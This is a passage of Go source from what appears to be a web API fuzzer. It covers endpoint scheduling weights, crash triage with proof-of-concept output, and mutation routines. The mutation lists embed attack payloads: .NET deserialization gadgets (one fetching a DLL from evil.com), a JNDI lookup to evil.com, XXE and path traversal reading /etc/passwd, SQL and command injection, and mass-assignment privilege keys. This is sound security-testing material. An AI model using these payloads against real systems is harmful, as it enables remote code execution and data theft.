func (f *Fuzzer) templateDependencyWeight(tid int) float64 {
	info := f.depIndex[tid]
	if len(info.Reads) == 0 {
		if len(info.Writes) > 0 {
			return 1.2
		}
		return 1.0
	}
	ready := 0
	for dep := range info.Reads {
		if f.runtime.getDepValue(dep) != "" {
			ready++
		}
	}
	ratio := float64(ready) / math.Max(1, float64(len(info.Reads)))
	weight := 0.2 + ratio*1.8
	if len(info.Writes) > 0 {
		weight += 0.2
	}
	return clampFloat(weight, 0.05, 2.4)
}

func (f *Fuzzer) templateHealthWeight(tid int) float64 {
	meta := f.meta[tid]
	k := endpointKey(meta.Method, meta.Norm)
	// Crash amplification override: always heavily prioritize recently crashing endpoints.
	// This bypasses the normal health-weight penalty so that a first-seen crash leads to
	// intensive follow-up fuzzing rather than the endpoint getting down-weighted due to 4xx ratio.
	if remaining, ok := f.crashBoost[k]; ok && remaining > 0 {
		f.crashBoost[k] = remaining - 1
		return math.Max(0.0, f.cfg.CrashBoostWeight)
	}
	ep := f.endpointStats[k]
	if ep == nil || ep.Reqs == 0 {
		return 1.0
	}
	reqs := float64(ep.Reqs)
	succ := float64(ep.S2xx)
	client := float64(ep.S4xx + ep.S401403)
	successRate := succ / math.Max(1, reqs)
	clientRatio := client / math.Max(1, reqs)
	// Hard cap: no single endpoint should monopolize the run when it no longer yields edges.
	shareCap := clampFloat(f.cfg.EndpointReqShareCapPct, 0.0, 100.0) / 100.0
	capReqs := maxInt(f.cfg.EndpointReqCapMinReqs, int(float64(f.totalDone)*shareCap))
	if ep.Reqs > capReqs && ep.NewEdges == 0 {
		return f.cfg.EndpointNoEdgeCapWeight
	}

	// Crash rate throttle: reliably crashing endpoints should be down-weighted.
	crashTotal := ep.Logged5xx + ep.Filtered5xx
	crashRateThreshold := clampFloat(f.cfg.EndpointCrashRateThreshold, 0.0, 100.0) / 100.0
	if crashTotal > f.cfg.EndpointCrashRateMinCrashes && float64(crashTotal)/reqs > crashRateThreshold {
		return f.cfg.EndpointCrashRateWeight
	}

	w := 1.0
	if ep.Reqs >= 12 && ep.S2xx == 0 && clientRatio > 0.9 {
		if ep.Reqs >= 40 {
			w *= 0.08
		} else {
			w *= 0.2
		}
	} else {
		w *= math.Max(0.25, 0.25+successRate*1.75)
	}
	if ep.NewEdges == 0 && ep.Reqs >= maxInt(20, f.cfg.EndpointZeroEdgeReqs) {
		w *= 0.05
	}
	if ep.ReqsSinceEdge >= maxInt(20, f.cfg.EndpointStallReqs) {
		switch {
		case ep.ReqsSinceEdge >= f.cfg.EndpointStallReqs*4:
			w *= 0.05
		case ep.ReqsSinceEdge >= f.cfg.EndpointStallReqs*2:
			w *= 0.15
		default:
			w *= 0.35
		}
	}
	if ep.Reqs >= maxInt(100, f.cfg.EndpointZeroEdgeReqs*2) && float64(ep.NewEdges)/math.Max(1, reqs) < 0.002 {
		w *= 0.6
	}
	if st := f.authBlocked[k]; st != nil && ep.S2xx == 0 {
		if st.Count >= 15 {
			w *= 0.01
		} else if st.Count >= 5 {
			w *= 0.05
		}
	}
	return math.Max(0.03, w)
}

func (f *Fuzzer) ensureEndpointStats(method, path string) *EndpointStats {
	norm := normalizeEndpointPath(path)
	k := endpointKey(method, norm)
	ep := f.endpointStats[k]
	if ep == nil {
		ep = &EndpointStats{Method: method, Path: norm}
		f.endpointStats[k] = ep
	}
	return ep
}

func (f *Fuzzer) ensureMutationStats(name string) *MutationStats {
	if name == "" {
		name = "seed"
	}
	ms := f.mutationStats[name]
	if ms == nil {
		ms = &MutationStats{Name: name}
		f.mutationStats[name] = ms
	}
	return ms
}

// recordCrash logs the crash and returns true if it was a previously-unseen unique crash.
func (f *Fuzzer) recordCrash(res SendResult) bool {
	f.totalCrashes++
	f.addEvent(fmt.Sprintf("CRASH %d  %s %s  %s", res.Status, res.Item.Method, truncate(normalizePath(res.Item.Path), 60), truncate(res.Item.MutationName, 28)))
	elapsed := time.Since(f.startTime).Seconds()
	sig := f.crashSignature(res.Item.Method, res.Item.Path, res.Status, res.Item.MutationLabel, res.ExceptionType, res.Body)
	triage := f.triageCrash(res)
	rec := CrashRecord{
		TS:            time.Now().Format(time.RFC3339),
		ElapsedSec:    fmt.Sprintf("%.3f", elapsed),
		Signature:     sig,
		Status:        res.Status,
		Method:        sanitizeText(res.Item.Method, 32),
		Path:          sanitizeText(res.Item.Path, 1024),
		Identity:      sanitizeText(res.Item.Identity, 64),
		Mutation:      sanitizeText(res.Item.MutationLabel, 2048),
		Payload:       sanitizeText(res.Item.Body, 8000),
		Response:      sanitizeText(res.Body, 8000),
		ExceptionType: res.ExceptionType,
		Triage:        triage,
	}
	_ = f.crashWriter.Write(rec)
	if _, ok := f.uniqueCrashKeys[sig]; ok {
		return false
	}
	f.uniqueCrashKeys[sig] = struct{}{}
	f.uniqueCrashes++

	triageBudget := time.Duration(f.cfg.TimeBudgetMinutes * float64(time.Minute) * 0.15)
	skipExpensive := f.triageTimeSpent > triageBudget

	minimized := map[string]any{}
	pocItem := res.Item
	if f.cfg.MinimizeCrash && !skipExpensive {
		t0 := time.Now()
		if mi, changed, probes := f.minimizeCrashCandidate(res.Item, res.Status); changed {
			minimized = map[string]any{
				"changed":  true,
				"probes":   probes,
				"path":     sanitizeText(mi.Path, 1024),
				"payload":  sanitizeText(mi.Body, 8000),
				"mutation": sanitizeText(mi.MutationLabel, 1024),
			}
			pocItem = mi
			rec.Minimized = minimized
		} else if probes > 0 {
			minimized = map[string]any{
				"changed": false,
				"probes":  probes,
			}
		}
		f.triageTimeSpent += time.Since(t0)
	}

	repro := map[string]any{}
	if f.cfg.ReproRuns > 0 && !skipExpensive {
		t0 := time.Now()
		repro = f.reproCheckCrash(pocItem, res.Status)
		rec.Repro = repro
		f.triageTimeSpent += time.Since(t0)
	}
	reportHeaders := f.resolvedCrashHeaders(pocItem)
	curlCommand := f.buildInlineCurlCommand(pocItem, reportHeaders)
	reportPath := strings.ToValidUTF8(pocItem.Path, "?")
	if strings.TrimSpace(reportPath) == "" {
		reportPath = "/"
	}
	reportPayload := strings.ToValidUTF8(pocItem.Body, "?")
	reportMutation := strings.ToValidUTF8(pocItem.MutationLabel, "?")
	if strings.TrimSpace(reportMutation) == "" {
		reportMutation = strings.ToValidUTF8(pocItem.MutationName, "?")
	}
	pocFile := f.writeCrashPoC(sig, res, pocItem, triage, repro, minimized)
	timelineFile := f.writeExploitTimeline(sig, res, pocItem)
	rec.PocFile = pocFile
	rec.TimelineFile = timelineFile
	// Queue targeted follow-up requests for this unique crash to find bug variants.
	f.enqueueCrashReplay(res.Item, f.cfg.CrashReplayCount)

	uniq := map[string]any{
		"signature":      sig,
		"ts":             rec.TS,
		"elapsed_secs":   rec.ElapsedSec,
		"status_code":    rec.Status,
		"method":         rec.Method,
		"path":           rec.Path,
		"identity":       rec.Identity,
		"mutation":       rec.Mutation,
		"payload":        truncate(rec.Payload, 4000),
		"response_body":  truncate(rec.Response, 4000),
		"exception_type": rec.ExceptionType,
		"triage":         triage,
		"repro":          repro,
		"minimized":      minimized,
		"poc_file":       pocFile,
		"timeline_file":  timelineFile,
	}
	_ = f.uniqueWriter.Write(uniq)

	// Boost this endpoint's weight for a bounded number of requests and activations.
	epKey := endpointKey(res.Item.Method, normalizePath(res.Item.Path))
	if f.cfg.CrashBoostRequests > 0 && f.cfg.CrashBoostWeight > 0 && f.crashBoostCount[epKey] < f.cfg.CrashBoostMaxPerEndpoint {
		f.crashBoost[epKey] = f.cfg.CrashBoostRequests
		f.crashBoostCount[epKey]++
	}

	f.findings = append(f.findings, CrashFinding{
		Signature:    sig,
		TS:           rec.TS,
		ElapsedSec:   rec.ElapsedSec,
		Method:       strings.ToValidUTF8(pocItem.Method, "?"),
		Path:         reportPath,
		Status:       rec.Status,
		Identity:     strings.ToValidUTF8(pocItem.Identity, "?"),
		Mutation:     reportMutation,
		Payload:      reportPayload,
		Response:     strings.ToValidUTF8(res.Body, "?"),
		Exception:    rec.ExceptionType,
		RequestHeads: cloneStringMap(reportHeaders),
		CurlCommand:  curlCommand,
		Triage:       cloneAnyMap(triage),
		Repro:        cloneAnyMap(repro),
		Minimized:    cloneAnyMap(minimized),
		PocFile:      pocFile,
		Timeline:     timelineFile,
	})
	f.crashLog = append(f.crashLog, map[string]any{
		"method":   rec.Method,
		"path":     rec.Path,
		"code":     rec.Status,
		"mutation": rec.Mutation,
		"triage":   triage,
	})
	return true
}

func (f *Fuzzer) recordClientErrorSample(method, path string, status int, body string) {
	k := endpointKey(method, normalizePath(path))
	s := f.clientSamples[k]
	if len(s) >= 5 {
		return
	}
	msg := truncate(strings.TrimSpace(body), 300)
	if msg == "" {
		msg = "<empty response body>"
	}
	s = append(s, fmt.Sprintf("%d %s", status, msg))
	f.clientSamples[k] = s
}

func (f *Fuzzer) recordAuthFailure(method, path string, status int, body string) {
	k := endpointKey(method, normalizePath(path))
	st := f.authBlocked[k]
	if st == nil {
		st = &AuthBlockedState{Reason: "auth"}
		f.authBlocked[k] = st
	}
	st.Count++
	low := strings.ToLower(body)
	for _, marker := range []string{"scope", "permission", "forbidden", "unauthorized", "token", "role"} {
		if strings.Contains(low, marker) {
			st.Reason = marker
			break
		}
	}
	if st.Count == 5 || st.Count == 15 {
		msg := fmt.Sprintf("%s status=%d reason=%s count=%d", k, status, st.Reason, st.Count)
		f.addEvent("[AUTH-BLOCK] " + msg)
		if !f.cfg.NoUI && !f.useDashboardUI() {
			fmt.Printf("[AUTH-BLOCK] %s\n", msg)
		}
	}
}

func (f *Fuzzer) recordAuthSuccess(method, path string) {
	k := endpointKey(method, normalizePath(path))
	delete(f.authBlocked, k)
}

func (f *Fuzzer) removeActiveTemplate(tid int) {
	out := make([]int, 0, len(f.activeIDs))
	for _, id := range f.activeIDs {
		if id != tid {
			out = append(out, id)
		}
	}
	f.activeIDs = out
}

func currentEpoch(epochs []Epoch, elapsed, total time.Duration) (int, Epoch) {
	frac := 1.0
	if total > 0 {
		frac = float64(elapsed) / float64(total)
	}
	cum := 0.0
	for i, ep := range epochs {
		cum += ep.Fraction
		if frac < cum {
			return i, ep
		}
	}
	return len(epochs) - 1, epochs[len(epochs)-1]
}

func exportTemplates(exporterPath, grammarDir, outPath string) error {
	exp := resolveExporterPath(exporterPath)
	if !fileExists(exp) {
		return fmt.Errorf("exporter not found: %s", exp)
	}
	cmd := exec.Command("python3", exp, "--grammar-dir", grammarDir, "--out", outPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func loadTemplates(path string) ([]Template, error) {
	buf, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var exp TemplateExport
	if err := json.Unmarshal(buf, &exp); err != nil {
		return nil, err
	}
	out := make([]Template, 0, len(exp.Templates))
	seen := map[int]struct{}{}
	for _, t := range exp.Templates {
		if _, ok := seen[t.ID]; ok {
			continue
		}
		seen[t.ID] = struct{}{}
		out = append(out, t)
	}
	return out, nil
}

func resolveDictionaryPath(dictArg, grammarDir string) string {
	cands := []string{}
	if dictArg != "" {
		cands = append(cands, dictArg)
	}
	if grammarDir != "" {
		cands = append(cands, filepath.Join(grammarDir, "dict.json"))
	}
	for _, p := range cands {
		if p == "" {
			continue
		}
		ap, err := filepath.Abs(p)
		if err == nil && fileExists(ap) {
			return ap
		}
	}
	return ""
}

func resolveExporterPath(path string) string {
	if path == "" {
		path = "./export-templates.py"
	}
	if filepath.IsAbs(path) && fileExists(path) {
		return path
	}
	if fileExists(path) {
		ap, _ := filepath.Abs(path)
		return ap
	}
	exe, err := os.Executable()
	if err == nil {
		dir := filepath.Dir(exe)
		cand := filepath.Join(dir, filepath.Base(path))
		if fileExists(cand) {
			return cand
		}
	}
	cwd, _ := os.Getwd()
	cand := filepath.Join(cwd, path)
	if fileExists(cand) {
		return cand
	}
	return path
}

func extractPathParamNames(requestID string) []string {
	res := []string{}
	for _, m := range rePathParam.FindAllString(requestID, -1) {
		t := strings.Trim(m, "{}")
		if t != "" {
			res = append(res, t)
		}
	}
	return dedupStrings(res)
}

var (
	depNameNoise = map[string]struct{}{
		"v1": {}, "v2": {}, "v3": {}, "api": {}, "exchange": {}, "post": {}, "put": {}, "get": {}, "delete": {},
		"patch": {}, "query": {}, "header": {}, "body": {}, "path": {}, "data": {}, "audit": {}, "created": {},
		"updated": {}, "writer": {}, "reader": {}, "response": {}, "request": {}, "status": {}, "name": {},
		"primary": {}, "reverse": {}, "notes": {}, "revision": {}, "true": {}, "false": {},
	}
	pathTokenNoise = map[string]struct{}{
		"v1": {}, "v2": {}, "v3": {}, "api": {}, "exchange": {}, "pairs": {}, "pair": {}, "rates": {}, "rate": {},
		"currencies": {}, "currency": {}, "users": {}, "user": {}, "accounts": {}, "account": {},
	}
	resourcePathNoise = map[string]struct{}{"v1": {}, "v2": {}, "v3": {}, "api": {}, "exchange": {}}
	runtimeLearnKeys  = []string{"id", "code", "name", "externalid", "status", "type", "revision", "key", "slug"}
)

func inferDependencyKeys(depName string) []string {
	dep := strings.ToLower(depName)
	tokens := splitNonAlnum(dep)
	keys := []string{}
	hasAnyID := false
	for _, t := range tokens {
		if t == "id" || strings.HasSuffix(t, "id") {
			hasAnyID = true
			break
		}
	}
	for _, m := range reWordID.FindAllStringSubmatch(dep, -1) {
		if len(m) < 2 {
			continue
		}
		base := m[1]
		if _, bad := depNameNoise[base]; !bad && base != "" {
			keys = append(keys, base+"Id")
		}
	}
	for i, t := range tokens {
		if _, bad := depNameNoise[t]; bad || t == "" {
			continue
		}
		if strings.HasSuffix(t, "id") && len(t) > 2 {
			base := t[:len(t)-2]
			if _, bad := depNameNoise[base]; !bad && base != "" {
				keys = append(keys, base+"Id")
			}
		}
		if t == "id" {
			if i > 0 {
				prev := tokens[i-1]
				if _, bad := depNameNoise[prev]; !bad && prev != "" {
					keys = append(keys, singularize(prev)+"Id")
				}
			}
			keys = append(keys, "id")
		}
	}
	if hasAnyID {
		for _, t := range tokens {
			if _, bad := depNameNoise[t]; bad || t == "" {
				continue
			}
			keys = append(keys, singularize(t)+"Id")
		}
	}
	if !hasAnyID && len(keys) == 0 {
		return nil
	}
	keys = append(keys, "id")
	keys = dedupStrings(keys)
	if len(keys) > 10 {
		keys = keys[:10]
	}
	return keys
}

func extractPathTokens(path string) [][2]string {
	out := make([][2]string, 0, 16)
	if path == "" {
		return out
	}
	for _, token := range strings.Split(path, "/") {
		t := strings.TrimSpace(token)
		if t == "" {
			continue
		}
		if _, bad := pathTokenNoise[strings.ToLower(t)]; bad {
			continue
		}
		hasShape := strings.ContainsAny(t, "0123456789") || strings.Contains(t, "-") || strings.Contains(t, "_")
		if !hasShape {
			continue
		}
		if len(t) > 128 {
			continue
		}
		out = append(out, [2]string{"id", t})
	}
	return out
}

func inferResourceIDKeyFromPath(path string) string {
	if path == "" {
		return ""
	}
	tokens := []string{}
	for _, token := range strings.Split(path, "/") {
		t := strings.ToLower(strings.TrimSpace(token))
		if t == "" {
			continue
		}
		if _, bad := resourcePathNoise[t]; bad {
			continue
		}
		if strings.Contains(t, "{") || strings.Contains(t, "}") || t == "-" {
			continue
		}
		if _, err := strconv.Atoi(t); err == nil {
			continue
		}
		if strings.ContainsAny(t, "0123456789") {
			continue
		}
		tokens = append(tokens, t)
	}
	if len(tokens) == 0 {
		return ""
	}
	return singularize(tokens[len(tokens)-1]) + "Id"
}

func extractJSONRuntimeValues(node any, outVals *[][2]string, outRels *[][4]string, depth int) {
	if depth > 6 {
		return
	}
	switch tv := node.(type) {
	case map[string]any:
		locals := make([][2]string, 0, len(tv))
		for k, v := range tv {
			kn := canonicalKey(k)
			isLearnable := strings.HasSuffix(kn, "id")
			if !isLearnable {
				for _, rk := range runtimeLearnKeys {
					if kn == rk || strings.HasSuffix(kn, rk) {
						isLearnable = true
						break
					}
				}
			}
			if isLearnable {
				if scalar, ok := toUsefulScalar(v); ok {
					*outVals = append(*outVals, [2]string{k, scalar})
					locals = append(locals, [2]string{k, scalar})
				}
			}
			if m, ok := v.(map[string]any); ok {
				if nested, ok := m["id"]; ok {
					if scalar, ok := toUsefulScalar(nested); ok {
						nk := k + "Id"
						*outVals = append(*outVals, [2]string{nk, scalar})
						locals = append(locals, [2]string{nk, scalar})
					}
				} else if nested, ok := m["Id"]; ok {
					if scalar, ok := toUsefulScalar(nested); ok {
						nk := k + "Id"
						*outVals = append(*outVals, [2]string{nk, scalar})
						locals = append(locals, [2]string{nk, scalar})
					}
				}
			}
			extractJSONRuntimeValues(v, outVals, outRels, depth+1)
		}
		if len(locals) > 1 {
			if len(locals) > 10 {
				locals = locals[:10]
			}
			for i := 0; i < len(locals); i++ {
				for j := i + 1; j < len(locals); j++ {
					*outRels = append(*outRels, [4]string{locals[i][0], locals[i][1], locals[j][0], locals[j][1]})
				}
			}
		}
	case []any:
		limit := minInt(100, len(tv))
		for i := 0; i < limit; i++ {
			extractJSONRuntimeValues(tv[i], outVals, outRels, depth+1)
		}
	}
}

func extractEntityIDs(body string, headers map[string]string) []string {
	out := []string{}
	if reJSONStartAny.MatchString(body) {
		var js any
		if err := json.Unmarshal([]byte(body), &js); err == nil {
			if m, ok := js.(map[string]any); ok {
				if id, ok := m["id"]; ok {
					if s, ok := toUsefulScalar(id); ok {
						out = append(out, s)
					}
				} else if id, ok := m["Id"]; ok {
					if s, ok := toUsefulScalar(id); ok {
						out = append(out, s)
					}
				}
				if data, ok := m["data"].([]any); ok {
					for _, el := range data {
						if mm, ok := el.(map[string]any); ok {
							if id, ok := mm["id"]; ok {
								if s, ok := toUsefulScalar(id); ok {
									out = append(out, s)
								}
							} else if id, ok := mm["Id"]; ok {
								if s, ok := toUsefulScalar(id); ok {
									out = append(out, s)
								}
							}
						}
					}
				}
			}
		}
	}
	loc := headers["Location"]
	if loc == "" {
		loc = headers["location"]
	}
	if loc != "" {
		parts := strings.Split(strings.TrimRight(loc, "/"), "/")
		if len(parts) > 0 {
			last := strings.TrimSpace(parts[len(parts)-1])
			if isUsefulValue(last) {
				out = append(out, last)
			}
		}
	}
	return uniqStrings(filterUsefulStrings(out))
}

func mutateJSONBody(body string, havocDepth int) (string, string) {
	if !reJSONStartObj.MatchString(body) {
		return body, ""
	}
	var js any
	if err := json.Unmarshal([]byte(body), &js); err != nil {
		return body, ""
	}
	obj, ok := js.(map[string]any)
	if !ok {
		return body, ""
	}
	ops := []func(map[string]any) (bool, string){
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			delete(m, k)
			return true, "json_del_key"
		},
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			m[k] = nil
			return true, "json_null_key"
		},
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			sv := flipJSONScalar(m[k])
			m[k] = sv
			return true, "json_flip_scalar"
		},
		// Type confusion: change a value's type (string→number, number→string, etc.)
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			m[k] = jsonTypeConfuse(m[k])
			return true, "json_type_confuse"
		},
		// Mass assignment: inject privilege-escalation keys
		func(m map[string]any) (bool, string) {
			injections := []struct {
				k string
				v any
			}{
				{"isAdmin", true}, {"role", "admin"}, {"is_superuser", true},
				{"permissions", []string{"*"}}, {"verified", true}, {"email_verified", true},
				{"__proto__", map[string]any{"isAdmin": true}},
				{"$type", "System.Object"}, {"active", true}, {"banned", false},
				{"price", 0.01}, {"discount", 99.99}, {"quantity", 999999},
			}
			inj := injections[rand.Intn(len(injections))]
			m[inj.k] = inj.v
			return true, "json_mass_assign"
		},
		// Deep nesting: wrap a value in nested objects to trigger stack overflow
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			depth := []int{10, 50, 100}[rand.Intn(3)]
			inner := map[string]any{"v": m[k]}
			for i := 0; i < depth; i++ {
				inner = map[string]any{"n": inner}
			}
			m[k] = inner
			return true, "json_deep_nest"
		},
		// Array overflow: replace a value with a large array
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			sz := []int{100, 1000, 10000}[rand.Intn(3)]
			arr := make([]any, sz)
			for i := range arr {
				arr[i] = i
			}
			m[k] = arr
			return true, "json_array_overflow"
		},
		// Duplicate key with different type (JSON spec allows, parsers differ)
		func(m map[string]any) (bool, string) {
			if len(m) == 0 {
				return false, ""
			}
			keys := mapKeysAny(m)
			k := keys[rand.Intn(len(keys))]
			m[k+""] = jsonTypeConfuse(m[k])
			return true, "json_dup_key"
		},
		// .NET deserialization $type injection into existing object
		func(m map[string]any) (bool, string) {
			gadgets := []string{
				"System.IO.FileInfo, System.IO.FileSystem",
				"System.Diagnostics.Process, System",
				"System.Windows.Data.ObjectDataProvider, PresentationFramework",
				"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install",
			}
			m["$type"] = gadgets[rand.Intn(len(gadgets))]
			return true, "json_dotnet_deser"
		},
	}
	labels := []string{}
	rounds := clampInt(havocDepth, 1, 3)
	for i := 0; i < rounds; i++ {
		perm := rand.Perm(len(ops))
		for _, idx := range perm {
			if ok, name := ops[idx](obj); ok {
				labels = append(labels, name)
				break
			}
		}
	}
	if len(labels) == 0 {
		return body, ""
	}
	buf, err := json.Marshal(obj)
	if err != nil {
		return body, ""
	}
	return string(buf), strings.Join(dedupStrings(labels), "+")
}

// jsonTypeConfuse returns a value of a different type than the input.
func jsonTypeConfuse(v any) any {
	switch v.(type) {
	case string:
		return []any{0, true, nil, 42.5}[rand.Intn(4)]
	case float64:
		return []any{"NaN", true, nil, "0"}[rand.Intn(4)]
	case bool:
		return []any{1, "true", nil, 0}[rand.Intn(4)]
	case nil:
		return []any{0, "", false, []any{}}[rand.Intn(4)]
	case []any:
		return map[string]any{"0": "converted"}
	case map[string]any:
		return []any{"converted"}
	default:
		return nil
	}
}

func flipJSONScalar(v any) any {
	switch tv := v.(type) {
	case bool:
		if tv {
			return false
		}
		return true
	case float64:
		return []float64{0.0, -1.0, tv * -1.0, 1e308}[rand.Intn(4)]
	case string:
		opts := []string{"", tv + "\u0000", strings.Repeat("A", 2048), "' OR '1'='1", "<script>alert(1)</script>", "not-a-date", "00000000-0000-0000-0000-000000000000"}
		return opts[rand.Intn(len(opts))]
	case nil:
		opts := []any{"null", 0, "", false}
		return opts[rand.Intn(len(opts))]
	default:
		return v
	}
}

func mutateAny(value, valueType string) (string, string) {
	t := strings.ToLower(strings.TrimSpace(valueType))
	switch t {
	case "string", "group", "unknown", "custom_payload", "custom_payload_header", "custom_payload_query", "custom_payload_uuid4_suffix":
		val, subcat := mutateStringCategorized(value)
		return val, subcat
	case "int", "integer":
		return mutateInt(value), "mutate_int"
	case "number", "float", "double", "decimal":
		return mutateNumber(value), "mutate_number"
	case "bool", "boolean":
		return mutateBool(value), "mutate_bool"
	case "datetime", "date", "date-time":
		return mutateDateTime(value), "mutate_datetime"
	case "uuid", "guid":
		return mutateUUID(value), "mutate_uuid"
	case "object":
		return mutateObject(value), "mutate_object"
	default:
		val, subcat := mutateStringCategorized(value)
		return val, subcat
	}
}

func mutateHavoc(value, valueType string, depth int) (string, string) {
	v := value
	names := []string{}
	for i := 0; i < clampInt(depth, 1, 4); i++ {
		var n string
		v, n = mutateAny(v, valueType)
		names = append(names, n)
	}
	return v, "havoc(" + strings.Join(names, "+") + ")"
}

// mutateStringCategorized picks a payload using MOpt-weighted category selection.
// Returns (mutated_value, sub_category_label) for tracking which category succeeds.
func mutateStringCategorized(v string) (string, string) {
	// 10% chance: value-derived mutations (reverse, null byte) that don't fit a category.
	if rand.Float64() < 0.10 {
		misc := []string{reverse(v), v + "\x00"}
		return misc[rand.Intn(len(misc))], "mcat_misc"
	}
	cat := pickMutationCategory()
	return cat.Payloads[rand.Intn(len(cat.Payloads))], "mcat_" + cat.Name
}

func mutateString(v string) string {
	val, _ := mutateStringCategorized(v)
	return val
}

func mutateInt(v string) string {
	x, _ := strconv.Atoi(strings.TrimSpace(v))
	cands := []int{0, 1, -1, 2, -2, 127, 128, -128, 255, 256, 32767, 32768, 65535, 65536, math.MaxInt32, math.MinInt32, x + 1, x - 1, x * 2}
	return strconv.Itoa(cands[rand.Intn(len(cands))])
}

func mutateNumber(v string) string {
	x, _ := strconv.ParseFloat(strings.TrimSpace(v), 64)
	cands := []string{"0.0", "-0.0", "0.1", "-0.1", "1e308", "-1e308", "1e-308", "999999999.999999", "0.0000000001", "3.141592653589793", fmt.Sprintf("%f", x+0.001), fmt.Sprintf("%f", x*-1.0)}
	return cands[rand.Intn(len(cands))]
}

func mutateBool(_ string) string {
	cands := []string{"true", "false", "null", "0", "1", "\"true\"", "yes"}
	return cands[rand.Intn(len(cands))]
}

func mutateDateTime(_ string) string {
	cands := []string{"0001-01-01T00:00:00Z", "9999-12-31T23:59:59Z", "1970-01-01T00:00:00Z", "2038-01-19T03:14:07Z", "", "not-a-date", "2024-13-45T99:99:99Z", "2020-02-29T12:00:00Z"}
	return cands[rand.Intn(len(cands))]
}

func mutateBusinessID(runtimeIDVals []string) string {
	prefixes := []string{"ID", "OBJ", "ENT", "RES", "REF", "USR", "ACC"}
	for _, v := range runtimeIDVals {
		vv := strings.TrimSpace(v)
		if vv == "" {
			continue
		}
		parts := splitNonAlnum(vv)
		if len(parts) > 0 && len(parts[0]) >= 2 {
			p := strings.ToUpper(parts[0])
			if len(p) <= 8 {
				prefixes = append(prefixes, p)
			}
		}
	}
	prefixes = uniqStrings(prefixes)
	p := prefixes[rand.Intn(len(prefixes))]
	strategies := []string{
		fmt.Sprintf("%s-%04d", p, rand.Intn(10000)),
		fmt.Sprintf("%s-%04d-%04d", p, rand.Intn(10000), rand.Intn(10000)),
		fmt.Sprintf("%s-%04d-%04d-%04d", p, rand.Intn(10000), rand.Intn(10000), rand.Intn(10000)),
		fmt.Sprintf("%s-0000", p),
		fmt.Sprintf("%s-9999", p),
		strings.ToLower(fmt.Sprintf("%s-%04d", p, rand.Intn(10000))),
	}
	return strategies[rand.Intn(len(strategies))]
}

func mutateUUID(_ string) string {
	cands := []string{"00000000-0000-0000-0000-000000000000", "ffffffff-ffff-ffff-ffff-ffffffffffff", "", "not-a-uuid", "12345", "' OR '1'='1", "566048da-ed19-4cd3-8e0a-b7e0e1ec4d72"}
	if rand.Float64() < 0.35 {
		return mutateBusinessID(nil)
	}
	return cands[rand.Intn(len(cands))]
}

func mutateObject(_ string) string {
	cands := []string{
		"{}",
		"null",
		"[]",
		// Prototype pollution
		`{"__proto__":{"isAdmin":true}}`,
		`{"constructor":{"prototype":{"isAdmin":true}}}`,
		// JSON.NET deserialization gadgets — triggers TypeNameHandling in .NET
		`{"$type":"System.IO.FileInfo, System.IO.FileSystem","FileName":"/etc/passwd"}`,
		`{"$type":"System.Diagnostics.Process, System","FileName":"id","Arguments":""}`,
		`{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","FileName":"id"}}`,
		`{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install","Path":"http://evil.com/payload.dll"}`,
		`{"$type":"System.Activities.Presentation.WorkflowDesigner, System.Activities.Presentation","PropertyInspectorFontAndColorData":"<xml/>"}`,
		`{"$type":"Microsoft.IdentityModel.Claims.WindowsClaimsIdentity, Microsoft.IdentityModel","label":"evil"}`,
		// Mass assignment / privilege escalation
		`{"isAdmin":true,"role":"admin","permissions":["*"],"verified":true}`,
		`{"__proto__":{"admin":true},"isAdmin":true,"role":"superuser","__admin":1}`,
		// XXE via JSON-XML bridges (Spring, etc.)
		`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		// Deeply nested structure — stack overflow / recursion DoS
		strings.Repeat(`{"a":`, 100) + `1` + strings.Repeat(`}`, 100),
		// Type confusion
		"true",
		"0",
		`""`,
		"[]",
	}
	return cands[rand.Intn(len(cands))]
}

// pathIDSegmentRe matches the last resource-ID-like segment in a URL path:
// digits (e.g. /product/42), UUIDs, or short alphanumeric tokens.
var pathIDSegmentRe = regexp.MustCompile(`/(\d+|[0-9a-fA-F\-]{8,36})(/|$|\?)`)

// pathMutationValues are tried in place of resource-ID path segments.
// Values must be safe to embed in a URL path segment (no { } $ unencoded slashes).
// Injection payloads are URL-encoded so they don't corrupt routing or the UI endpoint table.
var pathMutationValues = []string{
	"0", "-1", "1", "99999999", "2147483647", "-2147483648",
	"9999999999999999999",
	"null", "undefined", "NaN",
	// SQL injection — encoded for path safety
	"%27%20OR%20%271%27%3D%271",
	"%27%3B%20DROP%20TABLE%20users%3B--",
	// Path traversal
	"..%2F..%2F..%2Fetc%2Fpasswd",
	"..%252f..%252f..%252fetc%252fpasswd",
	"....%2F....%2F....%2Fetc%2Fpasswd",
	// JNDI — encoded; server-side may decode before logging
	"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%7D",
	// SSTI
	"%7B%7B7*7%7D%7D",
	// Command injection encoded
	"%3Bid",
	"%7Cid",
	"00000000-0000-0000-0000-000000000000",
	"ffffffff-ffff-ffff-ffff-ffffffffffff",
	strings.Repeat("A", 128),
	"foo",
	"1;",
	"'",
	"<img",
}

// mutatePath replaces the last ID-like segment in the URL path with a boundary or injection value.
// Returns ("", "") when no mutable segment is found.
func mutatePath(path string) (string, string) {
	// Split off query string to avoid corrupting it.
	base, query := path, ""
